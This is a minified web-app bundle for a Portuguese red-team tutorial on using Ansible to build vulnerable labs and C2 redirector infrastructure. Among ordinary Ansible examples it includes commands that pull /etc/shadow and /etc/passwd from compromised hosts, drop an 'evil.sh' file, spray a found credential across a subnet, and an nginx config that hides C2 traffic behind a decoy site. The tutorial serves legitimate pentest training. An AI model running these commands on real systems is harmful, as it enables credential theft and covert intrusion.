import{j as e}from"./index-CAFCz3B4.js";import{P as t}from"./PageContainer-CxmWgrx_.js";import{A as o}from"./AlertBox-Dze8I6Zt.js";import{C as a}from"./CodeBlock-C6bWIuPM.js";import{C as i}from"./CommandTable-CZCYoWRB.js";import{T as s,P as n}from"./PracticeBox-BDRu97pg.js";function u(){return e.jsxs(t,{title:"Ansible para pentester — automação ofensiva e provisioning de lab",subtitle:"Subir 30 alvos vulneráveis, deployar redirectors C2 em massa ou padronizar 5 Kali de operadores. Ansible faz tudo via SSH sem agente.",difficulty:"intermediario",timeToRead:"18 min",children:[e.jsx("h2",{children:"Por que Ansible em uma máquina ofensiva"}),e.jsxs("p",{children:["Ansible roda comandos remotos via SSH usando YAML declarativo. Sem agente no alvo, sem daemon. Para o operador de Red Team isso significa ",e.jsx("strong",{children:"quatro casos de uso"}),":"]}),e.jsxs("ul",{children:[e.jsxs("li",{children:[e.jsx("strong",{children:"Lab massivo:"})," levantar 20 VMs vulneráveis (DVWA, Metasploitable, AD lab) em 2 minutos."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Infra C2:"})," deployar 5 redirectors HTTPS em VPS diferentes com Nginx + Let's Encrypt + iptables sincronizados."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Padronização do Kali:"})," recriar seu Kali idêntico em qualquer máquina (extensões, .zshrc, ~/tools, wordlists customizadas)."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Pós-comprometimento limitado:"})," conseguiu credencial SSH em 50 hosts? Um playbook puxa ",e.jsx("code",{children:"/etc/shadow"}),", history e SSH keys de todos em paralelo."]})]}),e.jsx("h2",{children:"Instalação"}),e.jsx(s,{path:"~",lines:[{cmd:"sudo apt install -y ansible ansible-lint sshpass",out:`Setting up ansible (10.5.0+dfsg-1) ...
Setting up sshpass (1.10-1) ...
Setting up ansible-lint (24.10.0-1) ...`,outType:"success"},{comment:"alternativa: pipx — versão sempre atualizada e isolada",cmd:"pipx install --include-deps ansible",out:`  installed package ansible 11.1.0, installed using Python 3.12.7
  These apps are now globally available:
    - ansible
    - ansible-config
    - ansible-galaxy
    - ansible-playbook
    - ansible-vault`,outType:"info"},{cmd:"ansible --version",out:`ansible [core 2.18.1]
  config file = /etc/ansible/ansible.cfg
  configured module search path = ['/home/ana/.ansible/plugins/modules']
  ansible python module location = /usr/lib/python3/dist-packages/ansible
  python version = 3.12.7
  jinja version = 3.1.4`,outType:"default"}]}),e.jsx("h2",{children:"Inventory — onde rodar"}),e.jsxs("p",{children:["O ",e.jsx("strong",{children:"inventory"})," é a lista de hosts. Pode ser INI simples ou YAML estruturado com grupos, variáveis, padrões. Aceita ranges (",e.jsx("code",{children:"web[01:10]"}),")."]}),e.jsx(a,{language:"ini",title:"inventory.ini",code:`[redirectors]
red01.attacker.tld
red02.attacker.tld
red03.attacker.tld

[vuln_lab]
dvwa.lab     ansible_host=10.10.10.10
juice.lab    ansible_host=10.10.10.11
metasploit.lab ansible_host=10.10.10.12

[ad_lab]
dc01.lab     ansible_host=10.10.10.50 ansible_user=Administrator ansible_connection=winrm
dc02.lab     ansible_host=10.10.10.51 ansible_user=Administrator ansible_connection=winrm

[loot:children]
vuln_lab
ad_lab

[all:vars]
ansible_user=root
ansible_ssh_private_key_file=~/.ssh/id_lab
ansible_python_interpreter=/usr/bin/python3`}),e.jsx(a,{language:"yaml",title:"inventory.yaml (alternativa)",code:`all:
  vars:
    ansible_user: root
    ansible_ssh_private_key_file: ~/.ssh/id_lab
  children:
    redirectors:
      hosts:
        red01: { ansible_host: 198.51.100.10 }
        red02: { ansible_host: 198.51.100.11 }
    vuln_lab:
      hosts:
        dvwa:  { ansible_host: 10.10.10.10 }
        juice: { ansible_host: 10.10.10.11 }`}),e.jsx("h2",{children:"Comandos ad-hoc — fogo rápido"}),e.jsxs("p",{children:["Antes de escrever playbook, valide com comandos pontuais. Sintaxe:"," ",e.jsx("code",{children:'ansible <grupo> -m <módulo> -a "<args>"'}),"."]}),e.jsx(i,{title:"Recipes prontas",variations:[{cmd:"ansible all -m ping",desc:"Testa conexão e Python em todos os hosts.",output:'red01 | SUCCESS => { "ping": "pong" }'},{cmd:"ansible vuln_lab -a 'uptime'",desc:"Roda comando shell em paralelo.",output:"dvwa | CHANGED | rc=0 >>\\n 14:22:01 up 3 days,  2:14,  0 users"},{cmd:"ansible loot -m shell -a 'cat /etc/shadow' --become",desc:"Pull massivo de hashes via sudo.",output:"(50 hosts respondendo em paralelo, output em uma tela)"},{cmd:"ansible all -m copy -a 'src=evil.sh dest=/tmp/x mode=0755'",desc:"Drop de arquivo.",output:"Hash MD5 confirmado em todos os destinos."},{cmd:"ansible all -m fetch -a 'src=/etc/passwd dest=./loot/'",desc:"Puxa arquivo de cada host para diretório local separado por host.",output:"./loot/red01/etc/passwd, ./loot/red02/etc/passwd, ..."},{cmd:"ansible all -m apt -a 'name=tmux state=present' --become",desc:"Instala pacote em todos.",output:"redirectors padronizados."},{cmd:"ansible all -m service -a 'name=nginx state=restarted' --become",desc:"Restart de serviço em massa.",output:"Útil ao trocar config de redirector."},{cmd:"ansible all -m setup -a 'filter=ansible_distribution*'",desc:"Coleta facts (recon do parque).",output:"ansible_distribution: Debian, ansible_distribution_version: 12"}]}),e.jsx(s,{path:"~/c2-infra",lines:[{cmd:"ansible redirectors -m ping -i inventory.ini",out:`red01.attacker.tld | SUCCESS => {
    "ansible_facts": { "discovered_interpreter_python": "/usr/bin/python3" },
    "changed": false,
    "ping": "pong"
}
red02.attacker.tld | SUCCESS => {
    "changed": false,
    "ping": "pong"
}
red03.attacker.tld | UNREACHABLE! => {
    "changed": false,
    "msg": "Failed to connect to the host via ssh: ssh: connect to host red03.attacker.tld port 22: Connection refused",
    "unreachable": true
}`,outType:"warning"}]}),e.jsx("h2",{children:"Playbook — receita declarativa"}),e.jsxs("p",{children:["Playbook é YAML com lista de ",e.jsx("em",{children:"plays"}),"; cada play tem ",e.jsx("em",{children:"tasks"})," idempotentes. Rodou uma vez e o estado já está aplicado, rodar de novo não muda nada (o que é ouro para infra de C2 reproduzível)."]}),e.jsx(a,{language:"yaml",title:"playbooks/redirector.yml — sobe Nginx HTTPS proxy reverso para o teamserver",code:`---
- name: Provisiona redirector C2 (HTTPS → teamserver:443)
  hosts: redirectors
  become: true
  vars:
    teamserver: "ts.private.lan"
    legit_domain: "blog.example.tld"

  tasks:
    - name: Atualiza apt cache
      apt:
        update_cache: true
        cache_valid_time: 3600

    - name: Instala dependências
      apt:
        name: [nginx, certbot, python3-certbot-nginx, ufw]
        state: present

    - name: Habilita firewall (apenas 22, 80, 443)
      ufw:
        rule: allow
        port: "{{ item }}"
        proto: tcp
      loop: ["22", "80", "443"]

    - name: Ativa UFW
      ufw:
        state: enabled
        policy: deny

    - name: Drop config Nginx (template Jinja2)
      template:
        src: redirector.conf.j2
        dest: /etc/nginx/sites-available/{{ legit_domain }}.conf
        mode: "0644"
      notify: reload nginx

    - name: Habilita site
      file:
        src: /etc/nginx/sites-available/{{ legit_domain }}.conf
        dest: /etc/nginx/sites-enabled/{{ legit_domain }}.conf
        state: link
      notify: reload nginx

    - name: Emite certificado Let's Encrypt
      command: certbot --nginx -d {{ legit_domain }} --non-interactive --agree-tos -m ops@{{ legit_domain }}
      args:
        creates: /etc/letsencrypt/live/{{ legit_domain }}/fullchain.pem

  handlers:
    - name: reload nginx
      service:
        name: nginx
        state: reloaded`}),e.jsx(a,{language:"nginx",title:"playbooks/templates/redirector.conf.j2",code:`server {
    listen 443 ssl http2;
    server_name {{ legit_domain }};

    # SSL certs gerenciados pelo certbot
    ssl_certificate     /etc/letsencrypt/live/{{ legit_domain }}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/{{ legit_domain }}/privkey.pem;

    # Filtro: só encaminha se URI bater com perfil malleable do C2
    location ~ ^/(api/v1/data|cdn/static|images/.*\\.png)$ {
        proxy_pass https://{{ teamserver }};
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $remote_addr;
    }

    # Tudo mais: serve site legítimo (redireciona ou retorna 404)
    location / {
        return 302 https://example.com/;
    }
}`}),e.jsx(s,{path:"~/c2-infra",lines:[{cmd:"ansible-playbook -i inventory.ini playbooks/redirector.yml --check --diff",out:`PLAY [Provisiona redirector C2] *********************************************

TASK [Gathering Facts] ******************************************************
ok: [red01.attacker.tld]
ok: [red02.attacker.tld]

TASK [Atualiza apt cache] ***************************************************
changed: [red01.attacker.tld]
changed: [red02.attacker.tld]

TASK [Instala dependências] *************************************************
changed: [red01.attacker.tld]
changed: [red02.attacker.tld]

PLAY RECAP ******************************************************************
red01.attacker.tld : ok=8  changed=6  unreachable=0  failed=0
red02.attacker.tld : ok=8  changed=6  unreachable=0  failed=0`,outType:"info"},{comment:"--check é dry-run. Rodando de verdade:",cmd:"ansible-playbook -i inventory.ini playbooks/redirector.yml",out:"(roda a sequência completa em paralelo nos 2 hosts)",outType:"success"}]}),e.jsx("h2",{children:"Variáveis, vault e segredos"}),e.jsxs("p",{children:["Senhas e tokens não vão em texto puro. ",e.jsx("code",{children:"ansible-vault"})," criptografa qualquer arquivo YAML com AES-256. Você commita o vault, mas só roda quem tem a senha."]}),e.jsx(s,{path:"~/c2-infra",lines:[{cmd:"ansible-vault create group_vars/redirectors/vault.yml",out:`New Vault password: 
Confirm New Vault password: 
(abre o $EDITOR — escreva variáveis sensíveis)`,outType:"warning"},{cmd:"ansible-vault view group_vars/redirectors/vault.yml",out:`vault_letsencrypt_email: ops@example.tld
vault_teamserver_token: "Bearer eyJhbGciOiJIUzI1NiJ9..."
vault_ssh_root_password: "S3cr3tDeRedirec24!"`,outType:"info"},{cmd:"ansible-playbook -i inventory.ini playbooks/redirector.yml --ask-vault-pass",out:`Vault password: 
PLAY [Provisiona redirector C2] ...`,outType:"default"},{comment:"encripta string única e cola direto no YAML",cmd:'ansible-vault encrypt_string "S3cr3t!" --name=admin_pass',out:`admin_pass: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          61363934346165336432396233636435643735363636653834396237666165383435653639633239...`,outType:"muted"}]}),e.jsx("h2",{children:"Roles — modularização"}),e.jsxs("p",{children:["Conforme o playbook cresce, separe em ",e.jsx("strong",{children:"roles"}),": estruturas pré-definidas (",e.jsx("code",{children:"tasks/"}),", ",e.jsx("code",{children:"handlers/"}),", ",e.jsx("code",{children:"templates/"}),", ",e.jsx("code",{children:"vars/"}),","," ",e.jsx("code",{children:"defaults/"}),"). Permite reutilizar entre playbooks (ex: role ",e.jsx("em",{children:"baseline"})," ","+ role ",e.jsx("em",{children:"redirector"})," + role ",e.jsx("em",{children:"monitoring"}),")."]}),e.jsx(a,{language:"bash",title:"estrutura sugerida",code:`c2-infra/
├── ansible.cfg
├── inventory.ini
├── playbooks/
│   ├── redirector.yml
│   └── teamserver.yml
├── group_vars/
│   ├── all.yml
│   └── redirectors/
│       └── vault.yml
└── roles/
    ├── baseline/         # SSH hardening, ufw, unattended-upgrades
    │   ├── tasks/main.yml
    │   ├── handlers/main.yml
    │   └── templates/sshd_config.j2
    ├── redirector/       # nginx + certbot + filtros
    │   └── tasks/main.yml
    └── teamserver/       # docker + sliver + persistence
        └── tasks/main.yml`}),e.jsx("h2",{children:"Conexão sem SSH key — fallback útil"}),e.jsx(s,{path:"~",lines:[{comment:"alvo só aceita senha (caso clássico de credential reuse)",cmd:"ansible alvos -i 'host1,host2,' -m ping -u root --ask-pass",out:`SSH password: 
host1 | SUCCESS => { "ping": "pong" }
host2 | SUCCESS => { "ping": "pong" }`,outType:"warning"},{comment:"spray de credencial achada via Responder em /24 inteiro",cmd:'for ip in 10.10.10.{1..50}; do echo "$ip"; done > targets.txt && ansible all -i targets.txt, -m ping --ask-pass -u admin -e ansible_ssh_common_args="-o StrictHostKeyChecking=no"',out:"(em 30s você tem mapa de quem aceitou a credencial)",outType:"muted"}]}),e.jsx("h2",{children:"ansible.cfg — ajustes que economizam horas"}),e.jsx(a,{language:"ini",title:"./ansible.cfg",code:`[defaults]
inventory          = ./inventory.ini
host_key_checking  = False
forks              = 50
timeout            = 15
gathering          = smart
fact_caching       = jsonfile
fact_caching_connection = ./.facts_cache
stdout_callback    = yaml
log_path           = ./.ansible.log
retry_files_enabled = False

[ssh_connection]
pipelining = True
control_path = /tmp/ansible-ssh-%%h-%%p-%%r
ssh_args = -o ControlMaster=auto -o ControlPersist=300s -o PreferredAuthentications=publickey,password

[privilege_escalation]
become      = False
become_method = sudo
become_ask_pass = False`}),e.jsx(n,{title:"Provisione um lab de 3 alvos vulneráveis em 2 minutos",goal:"Inventory + playbook que sobe DVWA, Juice Shop e bWAPP via Docker em 3 VMs Linux distintas, prontas para treino.",steps:["Tenha 3 VMs Debian/Ubuntu acessíveis via SSH com chave.","Crie inventory.ini com o grupo vuln_lab.","Escreva playbooks/lab.yml que instala docker e roda os 3 containers.","Rode ansible-playbook e abra os 3 alvos no navegador."],command:`mkdir -p ~/labs/ans-lab && cd ~/labs/ans-lab

cat > inventory.ini <<'EOF'
[vuln_lab]
dvwa  ansible_host=10.10.10.10
juice ansible_host=10.10.10.11
bwapp ansible_host=10.10.10.12

[vuln_lab:vars]
ansible_user=root
ansible_ssh_private_key_file=~/.ssh/id_lab
EOF

cat > lab.yml <<'EOF'
---
- hosts: vuln_lab
  become: true
  vars:
    images:
      dvwa:  vulnerables/web-dvwa
      juice: bkimminich/juice-shop
      bwapp: raesene/bwapp
    ports:
      dvwa:  "80:80"
      juice: "80:3000"
      bwapp: "80:80"
  tasks:
    - apt: { name: docker.io, state: present, update_cache: yes }
    - service: { name: docker, state: started, enabled: yes }
    - docker_container:
        name: "{{ images[inventory_hostname] | basename }}"
        image: "{{ images[inventory_hostname] }}"
        ports:
          - "{{ ports[inventory_hostname] }}"
        restart_policy: unless-stopped
EOF

ansible-playbook -i inventory.ini lab.yml`,expected:`PLAY RECAP **********************************************************
dvwa  : ok=4  changed=3  unreachable=0  failed=0
juice : ok=4  changed=3  unreachable=0  failed=0
bwapp : ok=4  changed=3  unreachable=0  failed=0`,verify:"Abra http://10.10.10.10, .11 e .12 no navegador. Os três labs vão estar respondendo. Para destruir tudo, troque state: started por absent e re-rode."}),e.jsxs(o,{type:"warning",title:"Rastros: Ansible não é stealth",children:["Cada conexão Ansible cria ",e.jsx("code",{children:"~/.ansible/tmp/"})," no alvo, polui logs do SSH e roda Python visível em ",e.jsx("code",{children:"ps"}),". Em engagement contra blue team ativo, prefira execução manual ou C2 dedicado. Ansible é para infra ",e.jsx("strong",{children:"sua"})," ","(lab, redirectors, Kali fleet), não para pós-comprometimento silencioso."]}),e.jsx(o,{type:"info",title:"Próximo passo: Ansible + Terraform",children:"Combine Terraform (cria VPS na cloud) + Ansible (configura) e você tem todo o C2 reprovisionável em 5 minutos quando o IP queimar. Padrão da indústria de Red Team."})]})}export{u as default};
